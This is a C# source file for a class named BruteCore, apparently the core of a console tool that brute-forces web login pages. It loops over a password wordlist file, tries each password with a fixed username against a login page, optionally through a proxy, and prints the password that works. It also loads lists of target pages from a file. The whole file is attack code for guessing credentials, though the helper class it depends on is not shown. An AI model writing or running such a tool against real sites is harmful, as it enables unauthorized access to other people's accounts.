using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Reflection;

namespace ConsoleLogin
{
    class BruteCore
    {
        LoginCore page;
        List<LoginCore> pages;
        WebProxy defaultProxy;
        WebProxy currentProxy;
        bool keepSending;

        public BruteCore()
        {
            keepSending = false;
            pages = new List<LoginCore>();
        }
        public async void TestPage(string username, string password)
        { 
            await page.Login(username, password, currentProxy);
        }
        public async void StartBrute(int frequencySeconds,string passFile)
        {
            int sleepTime = frequencySeconds * 1000;
            keepSending = true;

            string _line;
            using (var classicStream = File.OpenRead(passFile))
            using (var streamReader = new StreamReader(classicStream))
            {
                while (keepSending == true && streamReader.Peek() >= 0)
                {
                    _line = streamReader.ReadLine();
                    if (await page.Login("tmp", _line, defaultProxy) == true)
                    {
                        keepSending = false;
                        Console.WriteLine("tmp" + _line);
                    }
                }
            }
            keepSending = false;
        }

        public void AddPage(LoginCore siteInfo)
        {
            pages.Add(siteInfo);
        }

        public async void ReadPagesFromFile(string path)
        {
            FileStream file = new FileStream(path, FileMode.Open, FileAccess.Read);
            var reader = new StreamReader(file);
            do
            {
                string _filePath = await reader.ReadLineAsync();
                LoginCore newPage = await LoginCore.InitializeFromFile(_filePath);
                pages.Add(newPage);
            } while (reader.Peek() >= 0);
            reader.Dispose();
            file.Dispose();
        }
        public void StopBrute()
        {
            keepSending = false;
        }
    }
}
